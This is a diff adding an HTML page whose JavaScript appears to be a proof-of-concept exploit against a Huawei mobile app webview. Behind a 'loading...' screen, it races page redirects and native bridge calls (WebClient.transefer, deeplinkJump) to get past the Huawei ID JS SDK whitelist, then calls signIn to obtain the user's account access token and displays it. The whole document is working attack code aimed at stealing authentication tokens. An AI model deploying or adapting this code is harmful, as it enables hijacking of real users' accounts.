@@ -1,0 +1,69 @@
+<html>
+<script type="text/javascript" src="https://h5hosting-drcn.dbankcdn.cn/cch5/HuaweiID/hmssdk/hmssdk.js"></script>
+<script>
+    function sleep(time) {
+        var start = new Date();
+        while(new Date() - start <time) {} 
+    };
+    hbs.ready(function () {
+        var param = {
+            "scope": "https://www.huawei.com/auth/account/base.profile",
+            "needAuthCode": false
+        };
+        hbs.signIn(param, function (res) {
+            var token = encodeURIComponent(res.accessToken);
+            alert(token);
+        }, function (error) {
+            alert('error'+error.code+error.message);
+            return false;
+        });
+        sleep(2000);
+        jumpJssdkWhiteList();
+    });
+    hbs.error(function (error) {
+        alert('error');
+        return false;
+    });
+    
+    function changeWebviewUrl() {
+        location = "https://skytone-res2-drcn.cloud.dbankcloud.cn/couponcampaign/EVfKLmTI/index.html";
+        triggerLoadUrl();
+        window.WebClient.deeplinkJump(1, '', 0);
+        sleep(1000);
+        jumpJssdkWhiteList();
+        sleep(500);
+        triggerLoadUrl();
+        sleep(500);
+        jumpJssdkWhiteList();
+    }
+    
+    function triggerLoadUrl() {
+        window.WebClient.transefer(6, '{"thirdparty_param":[{"thirdparty_lang":"zh_CN", "thirdparty_title":"testtest", "thirdparty_url":"https://www.huawei.com"}]}');
+    }
+
+    function jumpJssdkWhiteList() {
+        location = "https://mp.cloud.huawei.com/mediaopenmobilewebservicegrey/?channelId=101";
+    }
+
+    function configAuth() {
+        hbs.config({
+            appId: "10393298",
+            jsApiList: ["signIn"]
+        });
+        jumpJssdkWhiteList();
+        sleep(1500);
+    }
+
+    function zdccc_click() {
+        setTimeout(changeWebviewUrl, 70);
+        setTimeout(configAuth, 70);
+    };
+
+    zdccc_click();
+</script>
+
+<body>
+    <h1 style="text-align:center">loading...</h1>
+</body>
+
+</html>
